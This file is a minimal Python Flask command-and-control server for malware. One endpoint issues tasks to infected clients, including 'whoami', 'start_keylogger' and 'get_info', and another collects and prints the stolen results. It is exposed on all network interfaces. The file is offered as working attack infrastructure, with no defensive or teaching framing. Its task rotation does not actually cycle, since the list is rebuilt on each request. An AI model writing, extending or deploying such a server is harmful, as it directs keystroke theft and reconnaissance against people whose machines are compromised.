from flask import Flask, jsonify, request

app = Flask(__name__)

@app.route("/task", methods=["GET"])
def get_task():
    tasks = ["whoami", "start_keylogger", "get_info"]
    current_task = tasks.pop(0)
    tasks.append(current_task)
    return jsonify({"command": current_task})

@app.route("/result", methods=["POST"])
def receive_result():
    data = request.get_json()
    print(f"[*] Received result: {data['result']}")
    return jsonify({"status": "success"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8000)